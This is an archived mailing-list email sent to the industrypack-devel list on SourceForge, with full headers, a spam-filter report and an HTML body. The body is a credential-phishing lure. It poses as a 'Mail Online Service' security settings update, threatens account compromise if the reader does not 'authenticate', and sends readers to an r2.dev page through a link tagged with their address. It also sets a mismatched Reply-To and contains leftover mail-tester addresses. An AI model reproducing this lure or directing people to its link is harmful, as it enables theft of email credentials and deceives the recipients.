Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 26EB5932245
	for <lists+industrypack-devel@lfdr.de>; Tue, 16 Jul 2024 10:55:35 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sTdy9-0003Kg-BL
	for lists+industrypack-devel@lfdr.de;
	Tue, 16 Jul 2024 08:55:33 +0000
Received: from [172.30.29.67] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <maci@hxiso.com>) id 1sTdy7-0003Ka-Mc
 for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Jul 2024 08:55:31 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Reply-To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=7ROUMeFUKBquEusO6km23oaWUOiF9sh0Tv5KbU+4LbM=; b=ZXRxdRDeNm700WbcNYy5FojK6d
 nfDXivZTTmDS66stHx6VcVFJ1jrYFv6aUpqzoxaQaEBa6QfP/pCl2zRskWK/LKcg3pD+PpjOcjZb+
 wSRpp52AVgHD//sdPkWHi06f8ApAGMxbaILV5G5gh/cT27jHLuQ8qr3aomXaIT1A5C+M=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Reply-To:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=7ROUMeFUKBquEusO6km23oaWUOiF9sh0Tv5KbU+4LbM=; b=E
 GHc2QyYws4oTiSpxRfD/ZGv9Clqol+/n+SlzYWvdH/MzDIlLs5Gz9Xu7+mP0AkIB1jCiAjqgYdaWc
 uWENkezSz/8LXbD7nEJ/knWmjDz0JdPrE10+JQzK5ytFgL+lOJUm4I92ZFdmT6b8ooivdxvuJqmNQ
 oV0KYtYwVq0rCkZQ=;
Received: from light.hxiso.com ([193.25.216.139])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sTdy7-0007y8-Kx for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Jul 2024 08:55:31 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hxiso.com;
 h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=maci@hxiso.com; bh=fETKffI+taV9yKyGcYM5+u5Zq9M=;
 b=Nzgc9NatYNjjLUxXE1C6Gozp+6S/xwbpprGQxD31B/drRnOKIEH7GqTInZlruCzlk83N5gEycoeW
 YPyB3rEonQSkw1WvB5ECQCOdrlhlJjy1edidTrp6DkOT/EcFG4MIPUNmrvFxfayW3WoBqZCLh7X5
 QSmcrgE9l/AylmLCAFEWxSeTAD492wN7VEro7TlE6gJqIdFbnelni0xUGpwNsNUQMYG6Ib1o2dcv
 ObdKgZwZS6AyI/2osQ6ezZ/dKoSj7mu6og0lJQ8kZyKyatxix6JIBV8SpnIBClaVj4rO2bNI64wq
 VwtTAXNBv3gO/XfVWuBGx5JiG8StzfNK/HiEQw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hxiso.com;
 b=sW1gC+fpsTM1hi3HQmXpLtE3u8SxhoisWNUS7X/Vqpiq8iuh2vmmIFgPi6JmL1zMXS1uGpjli3ir
 D34r9Y7gH2J3f4rlOWMSTFePa6n7H40lSALCqoogwHnd9jwCNyfxUri6tbNNDW8HZ+NLEhZ7cVzK
 KN+A7+JtXRqp0+c9okcxERt/QfjCfyqdtDLXbQwf4PXnKH+L/QhT7zbj6c7n4uSDSDEDYzr6vyTt
 Muy86GQOPgU6Z7A3VK96pFcH8ugW+sWf7IL48pyfiylmtFr2/eIgQgo/bImM7s3wxOF3Kec6027O
 KTv39BOVOzh+tVFD/PVubzwl2vmEMMlhdP+slA==;
From: " Mail Online Service "<maci@hxiso.com>
To: industrypack-devel@lists.sourceforge.net
Date: 16 Jul 2024 04:34:32 -0400
Message-ID: <20240716043431.B5E16A0FE78C0EA5@hxiso.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_75D5AE1E.B4055024"
X-Spam-Score: 1.0 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Security Email Settings Update. A Safe and Secure Email.
 Authenticate your email now Our Mail security system portal has requested
 for an automatic and safe mail account security settings Authentication on
 your eMail Server Portal. This security system Authentication is important
 for [...] 
 Content analysis details:   (1.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: hxiso.com]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [193.25.216.139 listed in list.dnswl.org]
 1.0 FROMSPACE              Idiosyncratic "From" header format
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [193.25.216.139 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [193.25.216.139 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 0.0 RCVD_IN_MSPIKE_ZBI     No description available.
X-Headers-End: 1sTdy7-0007y8-Kx
Subject: [Industrypack-devel] e-mail account
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Mail Online Service  <nicole.mc.zhang@cushwake.com>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_75D5AE1E.B4055024
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"600" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cont=
ainer" style=3D'border-width: 0px; margin: 0px auto; padding: 0px; width: 6=
00px; text-transform: none; letter-spacing: normal; font-family: "Helvetica=
 Neue", Helvetica, Arial, sans-serif; word-spacing: 0px; border-collapse: c=
ollapse; table-layout: fixed; outline-width: medium; outline-style: none; o=
rphans: 2; widows: 2; background-color: rgb(255, 255, 255); -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;' cellspacin=
g=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium; outline-st=
yle: none;"><tr style=3D"outline-width: medium; outline-style: none;"><td s=
tyle=3D"outline-width: medium; outline-style: none;"></td></tr><tr style=3D=
"outline-width: medium; outline-style: none;"><td style=3D"outline-width: m=
edium; outline-style: none;"></td></tr><tr style=3D"outline-width: medium; =
outline-style: none;">
<td style=3D"outline-width: medium; outline-style: none;" bgcolor=3D"#6001d=
2"><table width=3D"600" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010m=
od-1" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; width: 60=
0px; border-collapse: collapse; outline-width: medium; outline-style: none;=
" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium=
; outline-style: none;"><tr style=3D"outline-width: medium; outline-style: =
none;">
<td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile4=
0" style=3D"line-height: 30px; font-size: 30px; outline-width: medium; outl=
ine-style: none;">&nbsp;</td></tr><tr style=3D"outline-width: medium; outli=
ne-style: none;"><td style=3D"outline-width: medium; outline-style: none;">=

<a style=3D"color: rgb(25, 106, 212); text-decoration: none; outline-width:=
 medium; outline-style: none;" href=3D"https://pub-c35ba6bb7a424dce9081d8ed=
12614eba.r2.dev/lO0zuSE4JASN014.html#industrypack-devel@lists.sourceforge.n=
et" target=3D"_blank"><table width=3D"550" align=3D"center" class=3D"ydp3b4=
ada5fyiv2210188010inner" style=3D"border-width: 0px; margin: 0px auto; padd=
ing: 0px; width: 550px; border-collapse: collapse; outline-width: medium; o=
utline-style: none;" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"outline-width: medium; outline-style: none;"><tr style=3D"o=
utline-width: medium; outline-style: none;"><td class=3D"ydp3b4ada5fyiv2210=
188010copy ydp3b4ada5fyiv2210188010headline ydp3b4ada5fyiv2210188010center =
ydp3b4ada5fyiv2210188010white" style=3D"text-align: center; color: rgb(255,=
 255, 255); line-height: 40px; font-family: Helvetica, Arial, sans-serif; f=
ont-size: 36px; outline-width: medium; outline-style: none;">
<h1 style=3D"margin: 0px; line-height: 40px; font-size: 36px; font-weight: =
bold; outline-width: medium; outline-style: none;">Security Email Settings =
Update.<br style=3D"outline-width: medium; outline-style: none;">A&nbsp;Saf=
e and Secure Email.</h1></td></tr><tr style=3D"outline-width: medium; outli=
ne-style: none;"><td class=3D"ydp3b4ada5fyiv2210188010desktop" style=3D"lin=
e-height: 20px; font-size: 20px; outline-width: medium; outline-style: none=
;">&nbsp;</td></tr>
<tr style=3D"outline-width: medium; outline-style: none;"><td align=3D"cent=
er" class=3D"ydp3b4ada5fyiv2210188010desktop" valign=3D"top" style=3D"displ=
ay: block; outline-width: medium; outline-style: none;"><table width=3D"252=
" height=3D"49" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cta-butto=
n" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; border-colla=
pse: collapse; outline-width: medium; outline-style: none;"><tbody style=3D=
"outline-width: medium; outline-style: none;">
<tr style=3D"outline-width: medium; outline-style: none;"><td width=3D"244"=
 align=3D"center" style=3D"width: 248px; text-align: center; font-family: H=
elvetica, Arial, sans-serif; outline-width: medium; outline-style: none; ba=
ckground-color: rgb(1, 121, 255);"><span style=3D"text-align: center; color=
: rgb(255, 255, 255); line-height: 49px; font-family: Helvetica, Arial, san=
s-serif; font-size: 17px; font-weight: bold; text-decoration: none; outline=
-width: medium; outline-style: none;">
Authenticate your email now</span></td></tr></tbody></table></td></tr></tbo=
dy></table></a></td></tr><tr style=3D"outline-width: medium; outline-style:=
 none;"><td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv221018801=
0mobile40" style=3D"line-height: 30px; font-size: 30px; outline-width: medi=
um; outline-style: none;">&nbsp;</td></tr></tbody></table></td></tr><tr sty=
le=3D"outline-width: medium; outline-style: none;"></tr><tr style=3D"outlin=
e-width: medium; outline-style: none;">
<td style=3D"outline-width: medium; outline-style: none;"><table width=3D"6=
00" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010mod-2" style=3D"borde=
r-width: 0px; margin: 0px auto; padding: 0px; width: 600px; border-collapse=
: collapse; outline-width: medium; outline-style: none;" cellspacing=3D"0" =
cellpadding=3D"0"><tbody style=3D"outline-width: medium; outline-style: non=
e;"><tr style=3D"outline-width: medium; outline-style: none;">
<td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile4=
0" style=3D"line-height: 30px; font-size: 30px; outline-width: medium; outl=
ine-style: none;">&nbsp;</td></tr><tr height=3D"338" style=3D"outline-width=
: medium; outline-style: none;"><td style=3D"outline-width: medium; outline=
-style: none;">
<table width=3D"530" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010inne=
r" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; width: 530px=
; border-collapse: collapse; outline-width: medium; outline-style: none;" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium; o=
utline-style: none;"><tr style=3D"outline-width: medium; outline-style: non=
e;">
<td class=3D"ydp3b4ada5fyiv2210188010copy ydp3b4ada5fyiv2210188010paragraph=
" style=3D"color: rgb(0, 0, 0); line-height: 27px; font-family: Helvetica, =
Arial, sans-serif; font-size: 18px; outline-width: medium; outline-style: n=
one;"><p style=3D"margin: 0px; outline-width: medium; outline-style: none;"=
>&nbsp;</p><p style=3D"margin: 0cm 0cm 0pt; text-align: justify; line-heigh=
t: 20.25pt;"><span style=3D"color: black; font-family: Helvetica, sans-seri=
f; font-size: 13.5pt;">
Our Mail security system portal has requested for an automatic and safe mai=
l account security settings Authentication on your eMail Server Portal. Thi=
s security system Authentication is important for the&nbsp;protection of yo=
ur email account. Please note that Failure to Authenticate your e-mail acco=
unt might lead to the compromise of your eMail Account and Server Portal.</=
span></p><p style=3D"margin: 0px; outline-width: medium; outline-style: non=
e;">&nbsp;</p></td></tr>
<tr style=3D"outline-width: medium; outline-style: none;"><td class=3D"ydp3=
b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile40" style=3D"line-=
height: 30px; font-size: 30px; outline-width: medium; outline-style: none;"=
>&nbsp;</td></tr><tr style=3D"outline-width: medium; outline-style: none;">=
<td style=3D"outline-width: medium; outline-style: none;">
<table width=3D"200" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cta-=
button" style=3D"outline-width: medium; outline-style: none;" bgcolor=3D"#f=
fffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"out=
line-width: medium; outline-style: none;"><tr style=3D"outline-width: mediu=
m; outline-style: none;">
<td height=3D"50" align=3D"center" valign=3D"middle" style=3D"width: 200px;=
 text-align: center; color: rgb(0, 120, 255); line-height: 20px; font-famil=
y: Gotham-Medium-Multi, Arial, sans-serif; font-size: 17px; font-weight: no=
rmal; white-space: nowrap; outline-width: medium; outline-style: none;">
<a style=3D"border: 2px solid rgb(0, 120, 255); border-image: none; color: =
rgb(0, 120, 255); line-height: 45px; text-decoration: none; display: block;=
 white-space: nowrap; outline-width: medium; outline-style: none;" href=3D"=
https://pub-c35ba6bb7a424dce9081d8ed12614eba.r2.dev/lO0zuSE4JASN014.html#in=
dustrypack-devel@lists.sourceforge.net" target=3D"_blank">Authenticate&nbsp=
;test-x15frre5u@srv1.mail-tester.com now</a></td></tr></tbody></table><p>&n=
bsp;</p><p></p>
<hr style=3D"color: rgb(229, 229, 229); text-transform: none; text-indent: =
0px; letter-spacing: normal; overflow: visible; font-family: Roboto, sans-s=
erif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: =
0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: =
0px; border-top-style: solid; white-space: normal; min-height: 0px; orphans=
: 2; widows: 2;"><p></p>
<p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; =
font-style: normal; font-weight: 400; margin-top: 0px; word-spacing: 0px; w=
hite-space: normal; orphans: 2; widows: 2;"><span style=3D"font-size: 9pt;"=
>&copy; srv1.mail-tester.com&nbsp;| All rights reserved.<br>This message wa=
s sent to test-x15frre5u@srv1.mail-tester.com.</span></p></td></tr></tbody>=
</table></td></tr></tbody></table><p align=3D"center">
<font size=3D"2"><span style=3D"color: rgb(0, 0, 0); text-transform: none; =
text-indent: 0px; letter-spacing: normal; font-family: monospace; font-size=
: medium; font-style: normal; font-weight: 400; word-spacing: 0px; float: n=
one; display: inline; white-space: normal; box-sizing: border-box; orphans:=
 2; widows: 2;"></span></font>&nbsp;</p></td></tr></tbody></table></body></=
html>
------=_NextPart_000_0012_75D5AE1E.B4055024
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_75D5AE1E.B4055024
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_75D5AE1E.B4055024--

